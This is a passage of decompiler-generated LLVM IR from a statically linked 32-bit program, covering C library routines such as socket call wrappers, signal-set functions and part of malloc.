  store i32 %v1_804fd1a, i32* %eax.global-to-local, align 4
  store i32 %v3_804fd16, i32* @edi, align 4
  %v3_804fd20 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804fd20, i32* %stack_var_-108, align 4
  %v1_804fd24 = call i32 @free(i32 %v3_804fd20)
  store i32 -1, i32* %v1_804fb85, align 4
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fe24

dec_label_pc_804fdac:                             ; preds = %dec_label_pc_804fcfa
  %v3_804fdb1.pre = load i32, i32* %stack_var_-76, align 4
  %v0_804fdb5.pre = load i32, i32* @edi, align 4
  store i32 %v0_804fdb5.pre, i32* %stack_var_-108, align 4
  %v3_804fdb6 = inttoptr i32 %v0_804fdb5.pre to i8*
  %v4_804fdb6 = call i32 @strncpy(i8* %v3_804fdb6, i32 %v3_804fdb1.pre, i32 %v1_804fbf3)
  store i32 %v4_804fdb6, i32* %eax.global-to-local, align 4
  %v3_804fdbc = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_804fdbc, i32* %stack_var_-108, align 4
  %v1_804fdc0 = call i32 @free(i32 %v3_804fdbc)
  store i32 %v1_804fdc0, i32* %eax.global-to-local, align 4
  %v12_804fdc8 = icmp eq i32 %tmp10, 1
  %v1_804fdcd = icmp eq i1 %v12_804fdc8, false
  br i1 %v1_804fdcd, label %dec_label_pc_804fe29, label %dec_label_pc_804fdcf

dec_label_pc_804fdcf:                             ; preds = %dec_label_pc_804fdac
  %v0_804fdcf = load i32, i32* @edx, align 4
  %v0_804fdd6 = load i32, i32* @ebp, align 4
  store i32 %v0_804fdd6, i32* %stack_var_-108, align 4
  %v3_804fdd7 = inttoptr i32 %tmp to i16*
  %v4_804fdd7 = call i32 @memcpy(i16* %v3_804fdd7, i32 4, i32 %v0_804fdcf)
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v0_804fde0 = load i32, i32* @edi, align 4
  store i32 %v0_804fde0, i32* %arg2, align 4
  %v1_804fde2 = add i32 %tmp18, 8
  %v2_804fde2 = inttoptr i32 %v1_804fde2 to i32*
  store i32 2, i32* %v2_804fde2, align 4
  %v0_804fde9 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fde9 = add i32 %v0_804fde9, 12
  %v2_804fde9 = inttoptr i32 %v1_804fde9 to i32*
  store i32 4, i32* %v2_804fde9, align 4
  %v3_804fdf0 = load i32, i32* %stack_var_-92, align 4
  store i32 %v3_804fdf0, i32* %edx.global-to-local, align 4
  %v1_804fdf4 = load i32, i32* %eax.global-to-local, align 4
  %v2_804fdf4 = add i32 %v1_804fdf4, 16
  %v3_804fdf4 = inttoptr i32 %v2_804fdf4 to i32*
  store i32 %v3_804fdf0, i32* %v3_804fdf4, align 4
  %v1_804fdfb = load i32, i32* %eax.global-to-local, align 4
  %v2_804fdfb = add i32 %v1_804fdfb, 4
  %v3_804fdfb = inttoptr i32 %v2_804fdfb to i32*
  store i32 %v1_804fc06, i32* %v3_804fdfb, align 4
  %v2_804fdfe = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_804fdfe, i32* %eax.global-to-local, align 4
  %v3_804fdff = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804fdff, i32* %stack_var_-108, align 4
  %v1_804fe03 = call i32 @free(i32 %v3_804fdff)
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  store i32 %tmp18, i32* %v1_804fb37, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804fb85, align 4
  br label %dec_label_pc_804fe24

dec_label_pc_804fe24:                             ; preds = %dec_label_pc_804fe29, %dec_label_pc_804fd13, %dec_label_pc_804fdcf
  br label %dec_label_pc_804fe4e

dec_label_pc_804fe29:                             ; preds = %dec_label_pc_804fdac
  %v3_804fe2c = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804fe2c, i32* %stack_var_-108, align 4
  %v1_804fe30 = call i32 @free(i32 %v3_804fe2c)
  store i32 1, i32* %v1_804fb85, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fe24

dec_label_pc_804fe49:                             ; preds = %dec_label_pc_804fbf3, %dec_label_pc_804fbd7, %dec_label_pc_804fbcb, %dec_label_pc_804fbb8, %dec_label_pc_804fbac
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fe4e

dec_label_pc_804fe4e:                             ; preds = %dec_label_pc_804fb98, %dec_label_pc_804fb91, %dec_label_pc_804fb4d, %entry, %dec_label_pc_804fe24, %dec_label_pc_804fce6, %dec_label_pc_804fc40, %dec_label_pc_804fe49
  store i32 %v0_804fb27, i32* @ebx, align 4
  store i32 %v0_804fb26, i32* @esi, align 4
  store i32 %v0_804fb25, i32* @edi, align 4
  store i32 %v0_804fb24, i32* @ebp, align 4
  %v0_804fe55 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_804fe55

; uselistorder directives
  uselistorder i32 %v2_804fc88, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_804fc0d, { 1, 0, 2 }
  uselistorder i32 %v1_804fc06, { 1, 0 }
  uselistorder i32 %v1_804fbf3, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_804fbbc.pre, { 0, 2, 1 }
  uselistorder i32 %v1_804fba5, { 1, 0 }
  uselistorder i32 %v2_804fb85, { 2, 0, 1, 3 }
  uselistorder i32* %v1_804fb85, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32* %v1_804fb37, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 0, 2, 3 }
  uselistorder i32 %tmp18, { 6, 5, 0, 4, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 27, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804fe4e, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804fe24, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804fbb8, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804fe73 = ptrtoint i32* %stack_var_-12 to i32
  %v2_804fe7a = call i32 @__socketcall(i32 3, i32 %v2_804fe73)
  ret i32 %v2_804fe7a

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804fe9f = ptrtoint i32* %stack_var_-12 to i32
  %v2_804fea6 = call i32 @__socketcall(i32 6, i32 %v2_804fe9f)
  ret i32 %v2_804fea6

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_804fedb = ptrtoint i32* %stack_var_-20 to i32
  %v2_804fee2 = call i32 @__socketcall(i32 15, i32 %v2_804fedb)
  ret i32 %v2_804fee2

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_804ff0f = ptrtoint i32* %stack_var_-16 to i32
  %v2_804ff16 = call i32 @__socketcall(i32 10, i32 %v2_804ff0f)
  ret i32 %v2_804ff16

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_804ff43 = ptrtoint i32* %stack_var_-16 to i32
  %v2_804ff4a = call i32 @__socketcall(i32 9, i32 %v2_804ff43)
  ret i32 %v2_804ff4a

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_804ff87 = ptrtoint i32* %stack_var_-24 to i32
  %v2_804ff8e = call i32 @__socketcall(i32 11, i32 %v2_804ff87)
  ret i32 %v2_804ff8e

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_804ffc3 = ptrtoint i32* %stack_var_-20 to i32
  %v2_804ffca = call i32 @__socketcall(i32 14, i32 %v2_804ffc3)
  ret i32 %v2_804ffca

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804ffef = ptrtoint i32* %stack_var_-12 to i32
  %v2_804fff6 = call i32 @__socketcall(i32 1, i32 %v2_804ffef)
  ret i32 %v2_804fff6

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 5, 4, 7, 0, 1, 3, 6, 2 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_8050018, label %dec_label_pc_805000b

dec_label_pc_805000b:                             ; preds = %entry
  %v1_805000b = add i32 %arg1, -64
  %v3_805000b = sub i32 63, %arg1
  %v4_805000b = and i32 %v3_805000b, %arg1
  %v5_805000b = icmp slt i32 %v4_805000b, 0
  %v6_805000b = icmp eq i32 %v1_805000b, 0
  %v7_805000b = icmp slt i32 %v1_805000b, 0
  %v3_805000e = icmp eq i1 %v7_805000b, %v5_805000b
  %v4_805000e = icmp eq i1 %v6_805000b, false
  %v5_805000e = and i1 %v4_805000e, %v3_805000e
  br i1 %v5_805000e, label %dec_label_pc_8050018, label %dec_label_pc_8050010

dec_label_pc_8050010:                             ; preds = %dec_label_pc_805000b
  %v4_8050013 = call i32 @__sigaddset(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_8050018

dec_label_pc_8050018:                             ; preds = %dec_label_pc_805000b, %entry, %dec_label_pc_8050010
  %v1_8050018 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_805001d = inttoptr i32 %v1_8050018 to i32*
  store i32 22, i32* %v1_805001d, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_805000b, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8050018, { 2, 0, 1 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  %v3_805003a = inttoptr i32 %arg1 to i8*
  %v4_805003a = call i32 @__GI_memset(i8* %v3_805003a, i32 0, i32 128)
  ret i32 0
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_8050048 = load i32, i32* @ebx, align 4
  %v15_8050049 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_805005d = icmp eq i32 %arg2, -1
  br i1 %v10_805005d, label %dec_label_pc_805006b, label %dec_label_pc_8050062

dec_label_pc_8050062:                             ; preds = %entry
  %tmp16 = icmp slt i32 %arg1, 1
  br i1 %tmp16, label %dec_label_pc_805006b, label %dec_label_pc_8050066

dec_label_pc_8050066:                             ; preds = %dec_label_pc_8050062
  %v7_8050069 = icmp sgt i32 %arg1, 64
  br i1 %v7_8050069, label %dec_label_pc_805006b, label %dec_label_pc_8050078

dec_label_pc_805006b:                             ; preds = %dec_label_pc_8050066, %dec_label_pc_8050062, %entry
  %v1_805006b = call i32 @__errno_location(i32 %v0_8050048)
  store i32 %v1_805006b, i32* %eax.global-to-local, align 4
  %v1_8050070 = inttoptr i32 %v1_805006b to i32*
  store i32 22, i32* %v1_8050070, align 4
  br label %dec_label_pc_80500ec

dec_label_pc_8050078:                             ; preds = %dec_label_pc_8050066
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050086

dec_label_pc_8050086:                             ; preds = %dec_label_pc_8050086.dec_label_pc_8050086_crit_edge, %dec_label_pc_8050078
  %v0_8050086 = phi i32 [ %v15_8050049, %dec_label_pc_8050078 ], [ %v0_8050086.pre, %dec_label_pc_8050086.dec_label_pc_8050086_crit_edge ]
  %v1_805009117 = phi i32 [ 31, %dec_label_pc_8050078 ], [ %v1_8050091, %dec_label_pc_8050086.dec_label_pc_8050086_crit_edge ]
  %v2_8050086 = mul i32 %v1_805009117, 4
  %v3_8050086 = add i32 %v2_8050086, 160
  %v4_8050086 = add i32 %v3_8050086, %v0_8050086
  %v5_8050086 = inttoptr i32 %v4_8050086 to i32*
  store i32 0, i32* %v5_8050086, align 4
  %v0_8050091.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8050091 = add i32 %v0_8050091.pre, -1
  %v9_8050091 = icmp slt i32 %v1_8050091, 0
  store i32 %v1_8050091, i32* %eax.global-to-local, align 4
  %v1_8050092 = icmp eq i1 %v9_8050091, false
  br i1 %v1_8050092, label %dec_label_pc_8050086.dec_label_pc_8050086_crit_edge, label %dec_label_pc_8050094

dec_label_pc_8050086.dec_label_pc_8050086_crit_edge: ; preds = %dec_label_pc_8050086
  %v0_8050086.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050086

dec_label_pc_8050094:                             ; preds = %dec_label_pc_8050086
  %v0_8050094 = load i32, i32* @edx, align 4
  %v2_8050097 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_8050097, i32* %eax.global-to-local, align 4
  %v4_805009f = call i32 @__sigaddset(i32 %v2_8050097, i32 %arg1, i32 %v0_8050094, i32 %v0_8050094)
  store i32 %v4_805009f, i32* %eax.global-to-local, align 4
  %v2_80500a7 = icmp slt i32 %v4_805009f, 0
  br i1 %v2_80500a7, label %dec_label_pc_80500ec, label %dec_label_pc_80500ab

dec_label_pc_80500ab:                             ; preds = %dec_label_pc_8050094
  %v4_80500b3 = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_805e760.176 to i32), i32 %arg1, i32 %v4_805009f, i32 %v4_805009f)
  %v2_80500cc = ptrtoint i32* %stack_var_-284 to i32
  %v2_80500d1 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_80500d1, i32* %eax.global-to-local, align 4
  %v4_80500da = call i32 @__libc_sigaction(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_80500cc)
  store i32 %v4_80500da, i32* %eax.global-to-local, align 4
  %v2_80500e2 = icmp slt i32 %v4_80500da, 0
  br i1 %v2_80500e2, label %dec_label_pc_80500ec, label %dec_label_pc_80500e6

dec_label_pc_80500e6:                             ; preds = %dec_label_pc_80500ab
  %v3_80500e6 = load i32, i32* %stack_var_-284, align 4
  br label %dec_label_pc_80500ef

dec_label_pc_80500ec:                             ; preds = %dec_label_pc_80500ab, %dec_label_pc_8050094, %dec_label_pc_805006b
  br label %dec_label_pc_80500ef

dec_label_pc_80500ef:                             ; preds = %dec_label_pc_80500e6, %dec_label_pc_80500ec
  %storemerge = phi i32 [ -1, %dec_label_pc_80500ec ], [ %v3_80500e6, %dec_label_pc_80500e6 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8050048, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8050091, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 8, 9, 5, 6 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 4, 2, 1, 3, 0, 5 }
  uselistorder label %dec_label_pc_80500ef, { 1, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_8050106 = add i32 %arg2, -1
  %v1_8050109 = urem i32 %v1_8050106, 32
  %v2_8050109 = icmp eq i32 %v1_8050109, 0
  %v2_805010c = udiv i32 %v1_8050106, 32
  br i1 %v2_8050109, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_805010f = shl i32 1, %v1_8050109
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_8050111 = phi i32 [ 1, %entry ], [ %v5_805010f, %bb ]
  %v2_8050111 = mul nuw nsw i32 %v2_805010c, 4
  %v3_8050111 = add i32 %v2_8050111, %arg1
  %v4_8050111 = inttoptr i32 %v3_8050111 to i32*
  %v5_8050111 = load i32, i32* %v4_8050111, align 4
  %v7_8050111 = and i32 %v5_8050111, %v6_8050111
  %v8_8050111 = icmp eq i32 %v7_8050111, 0
  %v1_8050115 = icmp eq i1 %v8_8050111, false
  %v2_8050115 = zext i1 %v1_8050115 to i32
  ret i32 %v2_8050115

; uselistorder directives
  uselistorder i32 %v1_8050109, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigaddset(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_805011c = load i32, i32* @ebx, align 4
  store i32 %v0_805011c, i32* %stack_var_-4, align 4
  %v1_805012a = add i32 %arg2, -1
  %v1_805012d = urem i32 %v1_805012a, 32
  %v2_805012d = icmp eq i32 %v1_805012d, 0
  store i32 %v1_805012d, i32* @ecx, align 4
  br i1 %v2_805012d, label %bb6, label %bb

bb:                                               ; preds = %entry
  %v5_8050130 = shl i32 1, %v1_805012d
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  %v6_8050135 = phi i32 [ 1, %entry ], [ %v5_8050130, %bb ]
  %v2_8050132 = udiv i32 %v1_805012a, 32
  store i32 %v2_8050132, i32* @edx, align 4
  %v2_8050135 = mul nuw nsw i32 %v2_8050132, 4
  %v3_8050135 = add i32 %v2_8050135, %arg1
  %v4_8050135 = inttoptr i32 %v3_8050135 to i32*
  %v5_8050135 = load i32, i32* %v4_8050135, align 4
  %v7_8050135 = or i32 %v5_8050135, %v6_8050135
  store i32 %v7_8050135, i32* %v4_8050135, align 4
  %v2_805013a = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805013a, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_8050132, { 1, 0 }
  uselistorder i32 %v1_805012d, { 2, 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_805014a = add i32 %arg2, -1
  %v1_805014d = urem i32 %v1_805014a, 32
  %v2_805014d = icmp eq i32 %v1_805014d, 0
  br i1 %v2_805014d, label %bb6, label %bb

bb:                                               ; preds = %entry
  %v4_8050150 = shl i32 -2, %v1_805014d
  %v5_8050150 = sub nsw i32 32, %v1_805014d
  %v6_8050150 = lshr i32 -2, %v5_8050150
  %v7_8050150 = or i32 %v6_8050150, %v4_8050150
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  %v6_8050155 = phi i32 [ -2, %entry ], [ %v7_8050150, %bb ]
  %v2_8050152 = udiv i32 %v1_805014a, 32
  %v2_8050155 = mul nuw nsw i32 %v2_8050152, 4
  %v3_8050155 = add i32 %v2_8050155, %arg1
  %v4_8050155 = inttoptr i32 %v3_8050155 to i32*
  %v5_8050155 = load i32, i32* %v4_8050155, align 4
  %v7_8050155 = and i32 %v5_8050155, %v6_8050155
  store i32 %v7_8050155, i32* %v4_8050155, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_805014d, { 1, 2, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__malloc_largebin_index() local_unnamed_addr {
entry:
  %v0_805015c = load i32, i32* @eax, align 4
  %v6_805016f = icmp ugt i32 %v0_805015c, 16777215
  br i1 %v6_805016f, label %dec_label_pc_8050180, label %dec_label_pc_8050171

dec_label_pc_8050171:                             ; preds = %entry
  %tmp = icmp ult i32 %v0_805015c, 256
  %v2_805015e = udiv i32 %v0_805015c, 256
  %v2_8050171 = call i32 @llvm.ctlz.i32(i32 %v2_805015e, i1 true)
  %v3_8050171 = xor i32 %v2_8050171, 31
  %v5_8050171 = select i1 %tmp, i32 95, i32 %v3_8050171
  %v1_8050174 = add nuw nsw i32 %v5_8050171, 6
  store i32 %v1_8050174, i32* @ecx, align 4
  %v2_8050177 = urem i32 %v1_8050174, 32
  %v4_8050177 = icmp eq i32 %v2_8050177, 0
  br i1 %v4_8050177, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_8050171
  %v5_8050177 = lshr i32 %v0_805015c, %v2_8050177
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_8050171, %bb
  %v0_8050179 = phi i32 [ %v0_805015c, %dec_label_pc_8050171 ], [ %v5_8050177, %bb ]
  %v1_8050179 = urem i32 %v0_8050179, 4
  %v2_805017c = mul nuw nsw i32 %v5_8050171, 4
  %v3_805017c = or i32 %v1_8050179, 32
  %v4_805017c = add nuw nsw i32 %v3_805017c, %v2_805017c
  br label %dec_label_pc_8050180

dec_label_pc_8050180:                             ; preds = %entry, %bb4
  %v0_8050181 = phi i32 [ 95, %entry ], [ %v4_805017c, %bb4 ]
  ret i32 %v0_8050181

; uselistorder directives
  uselistorder i32 %v2_8050177, { 1, 0 }
  uselistorder i32 %v0_805015c, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_8050180, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8050182 = load i32, i32* @ebp, align 4
  %v0_8050183 = load i32, i32* @edi, align 4
  %v0_8050184 = load i32, i32* @esi, align 4
  %v0_8050185 = load i32, i32* @ebx, align 4
  store i32 %v0_8050185, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8050197 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8050197, i32* @eax, align 4
  store i32 %v2_8050197, i32* %stack_var_-92, align 4
  %v2_805019c = call i32 @__pthread_return_void(i32 %v2_8050197, i32 134552147)
  store i32 %v2_805019c, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8058370.177 to i32), i32* %stack_var_-92, align 4
  %v1_80501a8 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8058370.177 to i32))
  store i32 %v1_80501a8, i32* %eax.global-to-local, align 4
  %v0_80501b0 = load i32, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v0_80501b0, -32
  br i1 %tmp, label %dec_label_pc_80501c7, label %dec_label_pc_80501b5

dec_label_pc_80501b5:                             ; preds = %entry
  %v0_80501b5 = load i32, i32* %stack_var_-92, align 4
  %v1_80501b5 = call i32 @__errno_location(i32 %v0_80501b5)
  store i32 %v1_80501b5, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_80501bc = inttoptr i32 %v1_80501b5 to i32*
  store i32 12, i32* %v1_80501bc, align 4
  br label %dec_label_pc_805091a

dec_label_pc_80501c7:                             ; preds = %entry
  %v1_80501c7 = add i32 %v0_80501b0, 11
  %tmp136 = icmp ult i32 %v1_80501c7, 16
  br i1 %tmp136, label %dec_label_pc_80501de, label %dec_label_pc_80501d7

dec_label_pc_80501d7:                             ; preds = %dec_label_pc_80501c7
  %v1_80501d7 = and i32 %v1_80501c7, -8
  br label %dec_label_pc_80501de

dec_label_pc_80501de:                             ; preds = %dec_label_pc_80501c7, %dec_label_pc_80501d7
  %storemerge133 = phi i32 [ %v1_80501d7, %dec_label_pc_80501d7 ], [ %v1_80501c7, %dec_label_pc_80501c7 ]
  %v1_805057e = phi i32 [ %v1_80501d7, %dec_label_pc_80501d7 ], [ 16, %dec_label_pc_80501c7 ]
  store i32 %storemerge133, i32* %eax.global-to-local, align 4
  %v0_80501de = load i8, i8* @global_var_805e7e0.178, align 1
  %v1_80501de = sext i8 %v0_80501de to i32
  store i32 %v1_80501de, i32* @ebx, align 4
  %v3_80501e4 = urem i8 %v0_80501de, 2
  %v4_80501e4 = icmp eq i8 %v3_80501e4, 0
  %v1_80501e7 = icmp eq i1 %v4_80501e4, false
  br i1 %v1_80501e7, label %dec_label_pc_8050206, label %dec_label_pc_80501e9

dec_label_pc_80501e9:                             ; preds = %dec_label_pc_80501de
  %v2_80501e9 = icmp eq i8 %v0_80501de, 0
  %v1_80501eb = icmp eq i1 %v2_80501e9, false
  br i1 %v1_80501eb, label %dec_label_pc_80504e9, label %dec_label_pc_80501f1

dec_label_pc_80501f1:                             ; preds = %dec_label_pc_80501e9
  store i32 ptrtoint (i8* @global_var_805e7e0.178 to i32), i32* %stack_var_-92, align 4
  %v2_80501f9 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_805e7e0.178 to i32*))
  store i32 %v2_80501f9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80504e9

dec_label_pc_8050206:                             ; preds = %dec_label_pc_80501de
  %v11_8050206 = trunc i32 %v1_805057e to i8
  %v8_805020a = icmp ugt i8 %v11_8050206, %v0_80501de
  br i1 %v8_805020a, label %dec_label_pc_8050227, label %dec_label_pc_805020c

dec_label_pc_805020c:                             ; preds = %dec_label_pc_8050206
  %v2_8050210 = udiv i32 %v1_805057e, 2
  store i32 %v2_8050210, i32* %eax.global-to-local, align 4
  %v1_8050212 = add i32 %v2_8050210, ptrtoint (i8* @global_var_805e7e0.178 to i32)
  store i32 %v1_8050212, i32* @ecx, align 4
  %v1_8050218 = add i32 %v2_8050210, add (i32 ptrtoint (i8* @global_var_805e7e0.178 to i32), i32 -4)
  %v2_8050218 = inttoptr i32 %v1_8050218 to i32*
  %v3_8050218 = load i32, i32* %v2_8050218, align 4
  store i32 %v3_8050218, i32* @edx, align 4
  %v1_805021b = icmp eq i32 %v3_8050218, 0
  br i1 %v1_805021b, label %dec_label_pc_8050227, label %dec_label_pc_805021f

dec_label_pc_805021f:                             ; preds = %dec_label_pc_805020c
  %v1_805021f = add i32 %v3_8050218, 8
  %v2_805021f = inttoptr i32 %v1_805021f to i32*
  %v3_805021f = load i32, i32* %v2_805021f, align 4
  store i32 %v3_805021f, i32* %eax.global-to-local, align 4
  store i32 %v3_805021f, i32* %v2_8050218, align 4
  br label %dec_label_pc_8050260

dec_label_pc_8050227:                             ; preds = %dec_label_pc_805020c, %dec_label_pc_8050206
  %v8_8050227 = icmp ult i32 %v1_805057e, 255
  %v6_805022f = icmp ugt i32 %v1_805057e, 255
  store i32 %v1_805057e, i32* @eax, align 4
  br i1 %v6_805022f, label %dec_label_pc_8050268, label %dec_label_pc_8050231

dec_label_pc_8050231:                             ; preds = %dec_label_pc_8050227
  %v2_8050235 = udiv i32 %v1_805057e, 8
  store i32 %v2_8050235, i32* %eax.global-to-local, align 4
  %v1_8050238 = mul nuw i32 %v2_8050235, 8
  %v2_8050238 = add i32 %v1_8050238, ptrtoint (i32* @global_var_805e80c.179 to i32)
  store i32 %v2_8050238, i32* @ecx, align 4
  %v1_8050243 = add i32 %v1_8050238, add (i32 ptrtoint (i32* @global_var_805e80c.179 to i32), i32 12)
  %v2_8050243 = inttoptr i32 %v1_8050243 to i32*
  %v3_8050243 = load i32, i32* %v2_8050243, align 4
  store i32 %v3_8050243, i32* @edx, align 4
  %v12_8050246 = icmp eq i32 %v3_8050243, %v2_8050238
  br i1 %v12_8050246, label %dec_label_pc_8050364.preheader, label %dec_label_pc_805024e

dec_label_pc_805024e:                             ; preds = %dec_label_pc_8050231
  store i32 %v1_805057e, i32* %ebx.global-to-local, align 4
  %v1_8050252 = add i32 %v3_8050243, 12
  %v2_8050252 = inttoptr i32 %v1_8050252 to i32*
  %v3_8050252 = load i32, i32* %v2_8050252, align 4
  store i32 %v3_8050252, i32* %eax.global-to-local, align 4
  %v2_8050255 = or i32 %v1_805057e, 4
  %v3_8050255 = add i32 %v3_8050243, %v2_8050255
  %v4_8050255 = inttoptr i32 %v3_8050255 to i32*
  %v5_8050255 = load i32, i32* %v4_8050255, align 4
